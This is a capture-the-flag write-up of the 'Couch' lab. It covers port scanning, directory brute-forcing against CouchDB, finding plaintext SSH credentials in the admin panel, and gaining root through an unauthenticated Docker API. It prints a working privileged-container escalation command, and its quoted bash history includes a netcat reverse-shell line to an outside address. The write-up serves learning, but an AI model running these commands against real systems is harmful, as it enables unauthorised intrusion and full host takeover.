<h1 align="center">Challenge 021 - Couch </h1>
<p align="center">
  <img width="90" height="89" alt="Bildschirmfoto vom 2025-09-18 10-20-53" src="https://github.com/user-attachments/assets/776245bc-61dd-4d6a-ad02-30564ff3e995" />
</p>
<p align="center"> <b>Difficulty</b>: 2/10 (Easy) <b>Completed</b>: ✔️ 18.9.2025 </p>

In this challenge we have to hack into a vulnerable database server that collects and stores data in JSON-based document formats. This challenge is probably a little bit more easy as it's semi-guided, but I hope I can still learn something from it.
So after deploying the machine we are asked how many ports are open, so we quickly proceed with the usual procedures. Scanning ports with nmap.

```
root@ip-10-10-139-20:~# nmap -p- 10.10.72.129
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-18 09:28 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.72.129
Host is up (0.00027s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5984/tcp open  couchdb
MAC Address: 02:D7:14:81:64:2F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
```

As we can easily deduce, two ports seem to be in use. The usual suspects with ssh, but also couchdb, which is a service I have never seen and is in use on port 5984. 
It seems to be a non-relational database, open-source, distributed and schema-free. Apparently CouchDB database is a collection of documents; each document is a bunch of string "keys" and corresponding "values" (which can be strings, numbers, lists, dates...). The idea will probably get more clear once we start exploring it in this challenge.

To find out the exact version of the management version I added the *-sV* flag to the command. Through that we also got the information about the concrete versions of the services

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
MAC Address: 02:D7:14:81:64:2F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see the version of the database system is 1.6.1.

Moving on we are asked what the path for the web administration tool for this database management system is. For that we can use gobuster to bruteforce with a wordslist again. I made sure that only the succesful responses (200) would be displayed as the output would otherwise be way too long. For that we disable the blacklist *(-b)*

```
root@ip-10-10-139-20:~# gobuster dir -u http://10.10.72.129:5984/ -w /usr/share/wordlists/dirb/common.txt -s '200' -b ''
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.72.129:5984/
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200
[+] User Agent:     gobuster/3.6
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_config              (Status: 200) [Size: 4808]
/_stats               (Status: 200) [Size: 4744]
/favicon.ico          (Status: 200) [Size: 9326]
/secret               (Status: 200) [Size: 229]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The answer format is in _***** so I just assumed that one of these directories would be the right answer, but I was wrong. Curling them at least gives some interesting outputs

```
root@ip-10-10-139-20:~# curl http://10.10.72.129:5984/secret
{"db_name":"secret","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":339,"instance_start_time":"1758187052381883","disk_format_version":6,"committed_update_seq":2}
```

but none of these outputs in JSON format really help me in my endeavors. 

This is where I started browsing the internet, checking out the CouchDB documentation and looking for some pages that were talking about some sort of admin panel. One website in particular was highlighting the built-in admistration interface, which was accessible through the *_utils* path.

I used the web browser to check this out.

<img width="976" height="538" alt="image" src="https://github.com/user-attachments/assets/a2fbba79-14c7-4b3f-9dd2-a803289b1a8f" />

And we have our entry point. Sweet.

Next we are asked to find out what's the path to list all databases in the web browser of said DBMS. One quick look in the documentation quickly reveals that too and it's very self explanatory

<img width="755" height="708" alt="Bildschirmfoto vom 2025-09-18 12-25-03" src="https://github.com/user-attachments/assets/235ca034-1cdd-4ca5-b1e5-d831b03ebbfc" />

I did a quick check to see, that would be the output:

<img width="970" height="181" alt="image" src="https://github.com/user-attachments/assets/8ee0fcc4-04c0-4cb9-bbcf-8881c5b7f9de" />

Cute. That takes care of that.

With that we move on to the question that asks us what the credentials found in the web admistration tool would be. When looking at the admin panel again, you can already see how a database "secret" was smiling at us the entire time, just asking to be checked out. When looking at the key of said database we see a query that displays a password in plaintext.

<img width="755" height="146" alt="Bildschirmfoto vom 2025-09-18 12-30-52" src="https://github.com/user-attachments/assets/a94a9b5a-2027-4cb4-9fee-6fe2270098e6" />

Sure, let's take that with us. Now we are able to access the ssh. It's time for some boot to root action again. 

```
root@ip-10-10-139-20:~# ssh atena@10.10.72.129
atena@10.10.72.129's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
```

We checked out the current directory with *ls* and cat'ed the user.txt. Now it's time for the last and probably most elaborate procedure: the escalation of privileges.

At the beginning I just tried to check out if I could maybe open the /etc/suoders file. No luck. After that I just checked out for SUID binaries by using


```
atena@ubuntu:/etc$ find / -perm -4000 -type f 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/bin/fusermount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Unfortunately none of these SUID binaries can be used to our advantage according to GTFOBins. Even checking the passwd file didn't reveal anything worthwhile for us. I tried to check the bash history of atena next in hopes of maybe finding something interesting.

```
atena@ubuntu:~$ cat .bash_history
sudo -s
cd /etc/apt/
rm sources.
rm sources.list
wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list
apt-get update
apt-get dist-upgrade 
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:couchdb/stable
sudo apt-get update
sudo apt-get install couchdb
sudo chown -R couchdb:couchdb /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo chmod -R 0770 /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo systemctl restart couchdb
curl localhost:5984
apt install curl
curl localhost:5984
nano /etc/couchdb/local.ini
$ sudo systemctl restart couchdb
sudo systemctl restart couchdb
sudo firewall-cmd --zone=public --add-port=5984/tcp --permanent
sudo apt-get install build-essential curl nodejs
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
curl -sSL https://rvm.io/mpapis.asc | sudo gpg --import -
curl -sSL https://rvm.io/pkuczynski.asc | sudo gpg --import -
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
source /usr/local/rvm/scripts/rvm
rvm list known
rvm install 2.2
rvm use 2.2 --default
gem install rails -v 5.0
gem install rails -v 4.1
cd /root/
ls
mkdir railsflag
cd railsflag/
ls
rails new flag
ls
cd flag/
ls
rails -s
nestat -antl
netstat -antl
rails server
gem 'sqlite3'
gem install sqlite3
ls
nano Gemfile
rails server
nano Gemfile
rails server
bundle install
rails server
apt-get remove netcat-openbsd 
apt-get install netcat-traditional 
rails server
nc -e /bin/sh 192.168.85.142 4444
rails server
cd ..
ls
gem unistall rails -v 4.1
gem remove rails -v 4.1
gem uninstall rails
rvm install 2.3
gem unistall rails -v 5.0.1
gem install rails -v 5.0.1
gem install sprockets -v 3.7.2
gem install rails -v 5.0.1
cd ..
rm -r railsflag/
mkdir railflag/
cd railflag/
ls
rails new flag
ls
cd flag/
ls
rails s
rails s -b '0.0.0.0'
nano Gemfile
rails s -b '0.0.0.0'
bundle install
rails s -b '0.0.0.0'
gem unistall rails -v 5.0.1
gem uninstall rails -v 5.0.1
gem uninstall rails
gem install rails -v 5.0.0
ls
rails -s
cd ..
rm -r railflag/
rails new flag
rails
rails -v
ls
cd  flag/
ls
nano Gemfile
rails -s
rails s
gem uninstall rails
cd ..
ls
rm flag/
rm -r flag/
ls
rails _5.0.0_ new flag
gem uninstall rails
rail s
rails s
rails -v
gem uninstall rails
rails -v
apt-get remove rails
gem uninstall rails
rails 
rails -v
gem list rails --local
ls
rm -r flag/
rails _5.0.0_ new flag
cd flag/
cat Gemfile
rails s
rails --version
rails 
apt-get remove rails
reboot
ip addr
apt-get install ssh
sudo apt-get install ssh
ls
gem uninstall rails 
gem
gem unistall rails
rvm
ls
netstat -antl
apt-get remove rails
rails
rails -v
ls
netstat -antl
sudo apt-get install docker
sudo service docker status
sudo reboot
ps aux
ip addr
ls
cd /root
ls
cd flag/
ls
cd ..
rm -r flag/
apt-get remove redis
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
uname -a
exit
```

As I (hopefully) had nothing to lose, I just started to run the docker command, which was executed to see what would happen. This seems to have been the trick as I suddenly had root rights.

```
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # ls
bin    etc    lib    mnt    proc   run    srv    tmp    var
dev    home   media  opt    root   sbin   sys    usr
/ # whoami
root
```

But how was I suddenly able to get root priviliges through the docker? I analyzed the command properly to explain this to me

1. **-H 127.0.0.1:2375**: This specifies the Docker host to connect to. Port 2375 is often used for the Docker API without TLS, allowing commands to be run without authentication.
2. **run --rm**: This command starts a new container and automatically removes it when it exits.
3. **-it**: This allows you to run the container in interactive mode, enabling you to interact with it through the terminal.
4. **--privileged**: This gives the container extended privileges, allowing it to access the host's devices and perform operations that are normally restricted.
5. **--net=host**: This allows the container to use the host's networking stack, which means it can access network services as if it were running on the host.
6. **-v/:/mnt**: This mounts the entire host filesystem into the container at /mnt, giving you access to all files on the host from within the container.

Basically by executing the command, we create a container through which a user could effectively gain root access to the host machine, as they can access all files and execute commands with root privileges. A significant security risk!

Now we only needed to access the root directory and cat the root.txt, which would have terminated the challenge, but this time it wasn't in said directory. Time to use the find command

```
~ # find / -name root.txt 2>/dev/null
/mnt/root/root.txt
```

It's done and dusted. The flag was ours. This was the first time I had the opportunity to run RCE with a Docker API, which was an attack vector in a boot to root, I was never really aware of. It was also a good showcase on how a non-relational database functions and to always make use of documentations.
